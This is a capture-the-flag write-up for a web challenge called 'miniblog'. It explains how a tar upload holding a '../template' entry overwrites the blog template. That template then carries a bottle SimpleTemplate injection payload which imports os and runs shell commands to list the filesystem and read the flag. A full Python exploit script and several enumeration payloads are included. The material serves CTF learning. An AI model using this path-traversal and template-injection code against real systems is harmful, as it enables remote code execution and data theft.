# miniblog
- Category: web
- Score: 353pts
- Solves: 14 solves
- Author: theoremoon

> I created a minimal blog platform. It doesn't use any complex things.
> Another instance: here

miniblog_466ff544c90345258849ac5dbde21b6a.tar.gz

## Description

Somehow I understood the question when I first see it lol.

It is a mini blog platform, after logging in I can do three things

- Create post
- Edit blog template
- Upload attachment in `tar` or `tar.gz`


The blog template contain some template, which I immediately feel it is SSTI
```py
    for brace in re.findall(r"{{.*?}}", content):
        if not re.match(r"{{!?[a-zA-Z0-9_]+}}", brace):
            return abort(400, "forbidden")
```

Hmm, weird regex.

The upload attachment feature only accept `tar` or `tar.gz`, and the question `tar.gz` provided have some weird `@PaxHeader` which does not unzip properly with 7-zip on windows, therefore I got a feeling of it is unzipping template to `../template` and bypass the filter.

## Solution

So lets create a tar file, and archive a file named `../template` in it, and copy some random SSTI code online in it. 

Failed.

---

Apparently the chal didn't use the common template solution `jinja2`, it is using `bottle` `
SimpleTemplate Engine` (as stated in the question description). So maybe I need to change the payload a bit?

The `SimpleTemplate Engine` support embedded python code so I can write easily.
https://bottlepy.org/docs/dev/stpl.html#simpletemplate-syntax

I tried these payload:

```
% for v in dir():
  {{v}}
% end
---
% for v in dir(__builtins__):
  {{v}}
% end
---
% for v in __builtins__:
  {{v}}
% end
---
% for v in __builtins__.values():
  {{v}}
% end
---
...
```

After these, I can import `os` and do RCE.

The full solution:

```py
#!/usr/bin/python2.7
import tarfile
import StringIO

tar = tarfile.TarFile("test.tar","w")
string = StringIO.StringIO()

# https://bottlepy.org/docs/dev/stpl.html#inline-expressions

string.write("""

{{ __builtins__.get("__import__")("os").popen('ls -al /').read() }}
{{ __builtins__.get("__import__")("os").popen('cat /unpredicable_name_flag').read() }}

""")

string.seek(0)
info = tarfile.TarInfo(name="../template")
info.size=len(string.buf)
tar.addfile(tarinfo=info, fileobj=string)
tar.close()
```

There are another interesting (unintended) solution is by inserting new line between `{{ }}` ( mentioned in https://furutsuki.hatenablog.com/entry/2020/09/06/230446 ). I haven't tried it tho.
